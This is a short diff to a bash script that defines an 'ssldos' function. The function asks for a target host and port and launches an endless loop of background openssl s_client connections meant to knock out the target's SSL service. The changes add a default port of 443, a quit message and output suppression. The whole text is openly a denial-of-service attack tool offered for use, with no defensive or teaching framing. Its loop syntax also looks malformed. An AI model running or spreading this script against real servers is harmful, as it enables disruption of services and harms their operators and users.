@@ -1,14 +1,15 @@
 #!/bin/bash
 ## create ssldos function
 ssldos() 
-{ echo "using openssl for SSL DOS"
+{ echo "Using openssl for SSL DOS"
 echo "Enter target:"
 read TARGET
-echo "Enter target port:"
+echo "Enter target port (defaults to 443):"
 read PORT
-echo "Starting SSL DOS attack" 
+: ${PORT:=443}
+echo "Starting SSL DOS attack...Use 'Ctrl c' to quit" && sleep 1
 while : for i in {1..10} 
-do openssl s_client -connect $TARGET:$PORT 2>/dev/null & 
+do echo "spawning instance"; openssl s_client -connect $TARGET:$PORT 2>/dev/null 1>/dev/null & 
 done
 }
 ## create listener function
